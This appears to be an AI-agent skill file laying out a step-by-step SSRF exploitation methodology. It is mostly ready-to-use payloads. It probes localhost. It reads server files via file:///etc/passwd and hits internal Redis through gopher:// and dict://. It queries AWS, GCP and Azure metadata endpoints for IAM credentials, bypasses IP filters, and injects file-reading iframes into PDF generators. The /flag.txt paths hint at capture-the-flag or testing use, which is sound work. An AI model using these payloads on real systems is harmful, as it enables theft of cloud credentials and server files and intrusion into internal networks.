---
name: ssrf-methodology
description: "Server-Side Request Forgery (SSRF) detection and exploitation methodology. Use when the target offers URL fetch/preview/import, PDF generation, webhooks, remote image loading, or RSS import. Includes a complete IP filter bypass collection, protocol exploitation (file/gopher/dict), cloud metadata theft, and internal service probing. Even when the parameter name looks harmless (such as src, callback, or next), load this skill for any scenario where the server initiates the request"
zh-signals: "系统性开展 SSRF 检测与利用，涵盖 IP 过滤绕过、协议利用、云元数据窃取与内网服务探测。信号:SSRF,内网探测,云元数据,协议利用,IP绕过"
when-to-use: >-
  Use when a target has URL fetch/preview/import, PDF generation, webhook, or remote image
  loading that may let the server initiate requests.
metadata:
  tags: "ssrf,server-side request forgery,internal-network,file-read,gopher,metadata,ip-bypass,cloud-metadata,webhook,gopherus"
  category: "exploit"
---

# SSRF Attack Methodology

## Further Reading

- Complete IP filter bypass list, cloud metadata paths, detailed protocol exploitation commands → [references/ssrf-bypass.md](references/ssrf-bypass.md)
- Advanced cloud SSRF (container / serverless credentials / K8s lateral movement / bypass techniques) → [references/cloud-ssrf.md](references/cloud-ssrf.md)
- Gopher protocol payload generation and practical combination chains → [references/gopherus-payloads.md](references/gopherus-payloads.md)

---

## Phase 1: Discover SSRF Entry Points

**Parameter name clues** (highly suspicious):
`url`, `uri`, `path`, `src`, `dest`, `redirect`, `callback`, `next`, `data`, `reference`, `site`, `html`, `imageUrl`, `feed`, `target`, `proxy`, `link`

**Feature clues**: URL preview, PDF/image generation (wkhtmltopdf, puppeteer), webhooks, remote image fetching, RSS import

## Phase 2: Basic SSRF Validation

```
url=http://127.0.0.1/
url=http://localhost/
url=http://127.0.0.1:PORT/
```

Judge by response differences: content changes → SSRF with output | status code only → blind | no difference → fully blind

**Trap**: the application may filter `127.0.0.1` but allow variants → you need a bypass ([references/ssrf-bypass.md](references/ssrf-bypass.md))

## Phase 3: Protocol Exploitation Quick Reference

```
url=file:///etc/passwd       # file read (highest value)
url=file:///flag.txt
url=gopher://127.0.0.1:6379/ # attack an internal Redis (⚠️ works with PHP curl, not with Python requests)
url=dict://127.0.0.1:6379/info
```

## Phase 4: Cloud Metadata Quick Reference

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # AWS
http://metadata.google.internal/computeMetadata/v1/                 # GCP (requires Header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01     # Azure (requires Header)
```

## Phase 5: Exploitation Decision Tree

```
SSRF entry point confirmed
├─ Output returned? → read content directly / probe ports
│  ├─ file:// usable? → read sensitive files (/etc/passwd, /flag.txt, /app/config.py)
│  ├─ Cloud environment? → query metadata for credentials → [references/ssrf-bypass.md](references/ssrf-bypass.md)
│  └─ Internal services? → probe Redis/ES/MongoDB → gopher exploitation
├─ Blind / fully blind?
│  ├─ Port scanning → status code / response time differences
│  └─ Out-of-band → DNS exfiltration / timing differences
├─ IP filtering? → encoding bypass → [references/ssrf-bypass.md](references/ssrf-bypass.md)
└─ Protocol restrictions? → check HTTP-only vs full protocol support
```

## Protocol and Library Limitations

Different implementations support different protocols — not every SSRF supports every protocol:

| Library / Environment | file:// | gopher:// | dict:// |
|---------|---------|-----------|---------|
| PHP curl | ✅ | ✅ | ✅ |
| Python requests | ❌ | ❌ | ❌ |
| Python urllib | ✅ | ❌ | ❌ |
| Java URLConnection | ✅ | ❌ | ❌ |
| Node.js fetch | ❌ | ❌ | ❌ |

**Short-form IP bypass**: `127.1`, `127.0.1` (zeroes omitted)

## Notes

- **file:// is the highest-value protocol**: it reads server files directly
- **Gopher trap**: PHP curl supports gopher, Python requests does not
- **SSRF and XXE are often combined**: the SYSTEM entity in XXE is SSRF
- **PDF generator SSRF**: wkhtmltopdf/puppeteer loads external resources while rendering a PDF, so injecting `<iframe src="file:///etc/passwd">` or `<img src="http://127.0.0.1/">` works
